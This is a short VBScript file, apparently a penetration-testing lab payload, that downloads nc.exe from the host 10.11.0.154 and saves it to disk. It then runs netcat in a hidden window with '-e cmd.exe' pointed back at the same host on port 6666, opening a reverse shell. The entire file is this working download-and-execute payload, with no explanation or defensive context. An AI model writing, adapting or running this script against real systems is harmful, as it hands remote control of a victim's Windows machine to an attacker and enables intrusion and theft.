dim http_obj
dim stream_obj
dim shell_obj

set http_obj = CreateObject("Microsoft.XMLHTTP")
set stream_obj = CreateObject("ADODB.Stream")
set shell_obj = CreateObject("shell.application") 

URL = "http://10.11.0.154/nc.exe"
FILENAME = "nc.exe" 'Name to save the file (on the local system)
Params = "-n 10.11.0.154  6666 -e cmd.exe"

http_obj.open "GET", URL, False
http_obj.send

stream_obj.type = 1
stream_obj.open
stream_obj.write http_obj.responseBody
stream_obj.savetofile FILENAME, 2

shell_obj.ShellExecute FILENAME , Params , "" , "" , 0

